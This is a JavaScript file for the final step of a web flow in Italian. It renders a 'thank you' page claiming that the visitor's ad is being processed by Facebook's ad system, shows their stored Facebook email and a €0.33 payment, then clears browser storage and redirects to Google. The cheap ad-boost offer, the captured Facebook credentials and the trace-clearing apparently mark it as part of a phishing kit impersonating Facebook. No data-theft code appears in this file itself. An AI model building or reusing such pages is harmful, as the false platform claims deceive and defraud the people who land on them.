// step5.js - Thank You Page

document.addEventListener('DOMContentLoaded', function() {
    loadStep5Content();
    initStep5();
});

function loadStep5Content() {
    const step5Container = document.getElementById('step5');
    
    step5Container.innerHTML = `
        <!-- Success Header -->
        <div style="background: linear-gradient(135deg, #5d8655 0%, #9fe491 100%); color: white; padding: 40px 30px; text-align: center; border-radius: 12px; margin-bottom: 25px;">
            <div style="font-size: 70px; margin-bottom: 15px; animation: bounce 1s ease infinite;">🎉</div>
            <h1 style="font-size: 36px; font-weight: 700; margin-bottom: 10px;">Grazie!</h1>
            <p style="font-size: 18px;">Il tuo annuncio è stato pubblicato con successo</p>
        </div>

        <!-- Summary Section -->
        <div style="padding: 0 20px;">
            <div style="font-size: 20px; color: #1c1e21; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; border-left: 4px solid #667eea; padding-left: 15px;">
                <i class="fas fa-chart-bar" style="color: #667eea;"></i> Riepilogo Campagna
            </div>

            <div id="thankYouSummary" style="background: #f7f8fa; border-radius: 16px; padding: 20px; margin-bottom: 25px; border: 1px solid #e4e6eb;">
                <div class="ad-row">
                    <span class="ad-label">Caricamento...</span>
                    <span class="ad-value">Attendi</span>
                </div>
            </div>

            <!-- Date Highlight -->
            <div id="thankYouDate" style="background: #e7f3ff; border-radius: 16px; padding: 20px; margin: 20px 0; text-align: center; border-left: 4px solid #667eea;">
                <div style="color: #667eea; font-size: 14px; font-weight: 600; text-transform: uppercase; margin-bottom: 10px;">
                    <i class="fa-solid fa-calendar"></i> Data di Pubblicazione
                </div>
                <div id="displayDate" style="font-size: 24px; font-weight: 700; color: #1c1e21;">15 Marzo 2024</div>
                <div id="displayTime" style="font-size: 18px; color: #65676b; margin-top: 5px;">alle 10:30</div>
            </div>

            <!-- Reach Info -->
            <div style="background: #f0f2f5; border-radius: 12px; padding: 15px; margin: 20px 0; text-align: center;">
                <p style="margin-bottom: 5px;"><i class="fa-solid fa-square-poll-vertical"></i> Copertura Giornaliera Stimata</p>
                <div style="font-size: 28px; font-weight: 700; color: #667eea;">3,000 - 10,000+</div>
                <p>visualizzazioni al giorno</p>
                <p class="offer-date">Durata dell’offerta: 7 giorni</p>
            </div>

            <!-- Exit Button -->
            <div style="text-align: center; padding: 20px 0;">
                <button class="exit-btn" id="finalExitBtn" style="background: white; color: #1c1e21; border: 2px solid #dadde1; padding: 16px 40px; font-size: 18px; font-weight: 600; border-radius: 50px; cursor: pointer; display: inline-flex; align-items: center; gap: 12px;">
                    <i class="fa-solid fa-arrow-right-from-bracket"></i> Esci
                </button>
            </div>

            <!-- Status Badge -->
            <div style="background: #6bb95c; color: white; padding: 10px 25px; border-radius: 50px; display: inline-block; font-size: 15px; font-weight: 600; margin: 15px 0;">
                <i class="fa-solid fa-circle-exclamation"></i> Stato: Attivo
            </div>

            <!-- Info Box -->
            <div style="background: #fff9e6; border-left: 4px solid #ffd700; padding: 20px; border-radius: 12px; margin: 25px 0;">
                <p style="color: #856404; line-height: 1.6;">✅ Il tuo annuncio è ora in elaborazione dal sistema pubblicitario di Facebook. Sarà attivo entro pochi minuti e raggiungerà 3.000 - 10.000+ visualizzazioni al giorno.</p>
            </div>
        </div>
    `;
}

function initStep5() {
    loadThankYouData();
    
    // Exit button handler
    document.getElementById('finalExitBtn').addEventListener('click', function() {
        // Clear all stored data
        localStorage.clear();
        sessionStorage.clear();
        
        // Redirect to Google
        window.location.href = 'https://www.google.com';
    });
}

function loadThankYouData() {
    const pendingAd = localStorage.getItem('pendingAd');
    const facebookUser = sessionStorage.getItem('facebookUser');
    const summaryDiv = document.getElementById('thankYouSummary');
    const displayDate = document.getElementById('displayDate');
    const displayTime = document.getElementById('displayTime');
    
    if (!summaryDiv) return;
    
    let html = '';
    
    if (pendingAd) {
        const adData = JSON.parse(pendingAd);
        const startDate = new Date(adData.startTime);
        
        // Format date for display
        const options = { year: 'numeric', month: 'long', day: 'numeric' };
        const timeOptions = { hour: '2-digit', minute: '2-digit' };
        
        displayDate.textContent = startDate.toLocaleDateString('it-IT', options);
        displayTime.textContent = 'alle ' + startDate.toLocaleTimeString('it-IT', timeOptions);
        
        // Build summary
        html += `
            <div class="ad-row" style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #dadde1;">
                <span class="ad-label" style="color: #65676b;">Data Inizio:</span>
                <span class="ad-value" style="color: #1c1e21; font-weight: 600;">${startDate.toLocaleDateString('it-IT')}</span>
            </div>
            <div class="ad-row" style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #dadde1;">
                <span class="ad-label" style="color: #65676b;">Ora Inizio:</span>
                <span class="ad-value" style="color: #1c1e21; font-weight: 600;">${startDate.toLocaleTimeString('it-IT')}</span>
            </div>
        `;
        
        if (adData.country && adData.country.name) {
            html += `
                <div class="ad-row" style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #dadde1;">
                    <span class="ad-label" style="color: #65676b;">Paese:</span>
                    <span class="ad-value" style="color: #1c1e21; font-weight: 600;">${adData.country.name}</span>
                </div>
            `;
        }
        
        if (adData.cities && adData.cities.length > 0) {
            html += `
                <div class="ad-row" style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #dadde1;">
                    <span class="ad-label" style="color: #65676b;">Città:</span>
                    <span class="ad-value" style="color: #1c1e21; font-weight: 600;">${adData.cities.join(', ')}</span>
                </div>
            `;
        }
    }
    
    if (facebookUser) {
        const user = JSON.parse(facebookUser);
        html += `
            <div class="ad-row" style="display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #dadde1;">
                <span class="ad-label" style="color: #65676b;">Facebook ID:</span>
                <span class="ad-value" style="color: #1c1e21; font-weight: 600;">${user.email}</span>
            </div>
        `;
    }
    
    html += `
        <div class="ad-row" style="display: flex; justify-content: space-between; padding: 12px 0; margin-top: 10px; color: #42b72a; font-weight: 700;">
            <span class="ad-label" style="color: #65676b;">Totale Pagato:</span>
            <span class="ad-value" style="color: #42b72a;">€0.33</span>
        </div>
    `;
    
    summaryDiv.innerHTML = html;
}

// Make sure exit button works
window.finalExit = function() {
    localStorage.clear();
    sessionStorage.clear();
    window.location.href = 'https://www.google.com';
};